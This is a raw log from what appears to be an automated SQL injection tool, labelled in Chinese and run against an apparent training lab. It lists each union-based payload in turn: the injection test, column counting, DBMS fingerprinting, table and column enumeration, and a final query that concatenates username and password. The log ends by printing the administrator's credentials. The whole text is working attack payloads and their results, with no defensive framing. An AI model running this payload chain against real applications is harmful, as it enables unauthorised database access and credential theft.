```!
[*] 偵測 SQLi
    [Payload] Gifts
    [Payload] ' OR 1=1 -- 
[+] 目標可能存在 SQLi
[*] 偵測欄位數
    [Payload] ' UNION SELECT NULL --  
    [Payload] ' UNION SELECT NULL,NULL --  
[+] 欄位數 = 2
[*] 偵測可回顯欄位
    [Payload] ' UNION SELECT 'DISP_COL_TEST',NULL-- 
[+] 可回顯欄位索引 = 1
[*] 偵測 DBMS
    [Payload] ' UNION SELECT @@version,NULL -- 
    [Payload] ' UNION SELECT version(),NULL -- 
[+] DBMS = PostgreSQL
[*] 取得 DB 版本
    [Payload] ' UNION SELECT version(),NULL -- 
[+] DB Version = PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
[*] 搜尋 user-like 資料表
    [Payload] ' UNION SELECT table_name,NULL FROM information_schema.tables WHERE LOWER(table_name) LIKE '%user%' AND table_schema NOT IN ('information_schema','pg_catalog') -- 
[+] 找到表：['user', 'users_cfnpru']
[*] 抓取 user 欄位
    [Payload] ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='user' -- 
[*] 抓取 users_cfnpru 欄位
    [Payload] ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_cfnpru' -- 
    [Payload] ' UNION SELECT (username_sqkfhl::text || ':' || password_gkqhlp::text),NULL FROM users_cfnpru -- 
[+] 找到 administrator 帳密 → administrator:nkvg7w39lprmp505mm2m
```